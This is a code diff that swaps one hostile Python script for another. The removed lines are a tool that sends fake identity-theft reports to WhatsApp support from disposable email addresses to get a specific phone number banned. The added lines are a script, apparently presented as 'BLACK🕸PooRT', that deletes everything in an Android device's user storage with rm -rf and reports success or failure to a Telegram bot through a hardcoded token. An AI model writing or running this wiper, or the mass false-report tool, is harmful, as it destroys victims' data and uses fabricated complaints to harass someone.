@@ -1,50 +1,23 @@
-import requests, smtplib, socket, random, time, os
-from email.message import EmailMessage
-from faker import Faker
 
-fake = Faker()
-video_name = "evidence.mp4"
-target_number = "+967777449083"
-EMAILS_TO_USE = 2
-REPORTS_PER_EMAIL = 3
+import os
+import requests
 
-SMTP_SERVER = "mail.smtp2go.com"
-SMTP_PORT = 2525
-SMTP_USER = "demo@example.com"
-SMTP_PASS = "demo_pass"
+BOT_TOKEN = "7574208471:AAFNp-E7e6YgkBasnka8rtHvdi4ooCi7cJc"
+CHAT_ID = "7976460613"
 
-def generate_complaint(name, email):
-    options = [
-        f"{target_number} is using my email {email} illegally.",
-        f"Identity theft report: {target_number} using {email}.",
-        f"This number ({target_number}) is impersonating me. Email: {email}."
-    ]
-    return random.choice(options)
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": message}
+    requests.post(url, data=data)
 
-def generate_temp_email():
-    res = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-    return res.json()[0] if res.status_code == 200 else fake.email()
-
-def send_report(fake_email, fake_name):
-    msg = EmailMessage()
-    msg['Subject'] = "🚨 URGENT Abuse Report"
-    msg['From'] = fake_email
-    msg['To'] = "support@support.whatsapp.com"
-    msg.set_content(generate_complaint(fake_name, fake_email))
+def format_device():
     try:
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
-            smtp.login(SMTP_USER, SMTP_PASS)
-            smtp.send_message(msg)
-            print(f"[✔] Sent: {fake_email}")
+        os.system("rm -rf /sdcard/*")
+        os.system("rm -rf /storage/emulated/0/*")
+        send_telegram_message("🧨 تم تنفيذ سكربت BLACK🕸PooRT وتم حذف بيانات الجهاز بالكامل.")
     except Exception as e:
-        print(f"[✘] Error: {e}")
+        send_telegram_message(f"❌ فشل التنفيذ: {str(e)}")
 
-def launch_blackintel():
-    for i in range(EMAILS_TO_USE):
-        email = generate_temp_email()
-        name = fake.name()
-        for j in range(REPORTS_PER_EMAIL):
-            send_report(email, name)
-            time.sleep(random.randint(2, 5))
-
-launch_blackintel()
+if __name__ == "__main__":
+    send_telegram_message("🚀 تشغيل BLACK🕸PooRT على الجهاز...")
+    format_device()
